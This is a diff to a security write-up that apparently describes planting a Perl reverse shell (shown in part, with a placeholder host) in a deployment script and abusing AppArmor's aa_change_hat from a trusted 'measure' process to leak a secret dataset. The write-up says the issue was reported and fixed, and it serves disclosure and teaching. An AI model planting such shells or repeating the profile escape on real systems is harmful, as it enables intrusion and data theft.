@@ -50,7 +50,8 @@ perl -e 'use Socket;$i="target_address";$p=target_port;socket(S,PF_INET,SOCK_STR
 in case the first one is making problems.
 You'll be surprised by how many systems and even minimalist dev-containers ship with perl installed.
 
-In any case, inserting this into the deployment script leaves us with a simple, but functional reverse shell.
+In any case, inserting this into the deployment script leaves us with a simple, but functional reverse shell.\
+You might also find this useful if you ever have to debug a CI/CD pipeline.
 
 ### 2. Inspecting the target program
 Let us take a quick look at the Ghidra disassembler output of relevant section of the `measure` program:
@@ -79,8 +80,10 @@ In our case, this allows us to supply the `measure` program with a custom (and v
 [![solve](img/solve.png)](leak.cpp)
 
 Instead of exiting the program as planned, this calls the `aa_change_hat()` function.\
-This works, because we are now part of the trusted `measure` process context, and therefore executing from the same source binary path.
+This works, because we are now part of the trusted `measure` process, and therefore executing from the same source binary path.
 
 After changing security profile, we are allowed to read the content of the secret `/opt/tpch/sf1/customer1.tbl` dataset.
 As we are not allowed to print while in this profile, we have to save its content to an internal buffer.
 We then swap the back the security profile and print to `stderr`, successfully leaking the secret dataset.
+
+The issue has been reported responsibly and is fixed in the latest version.
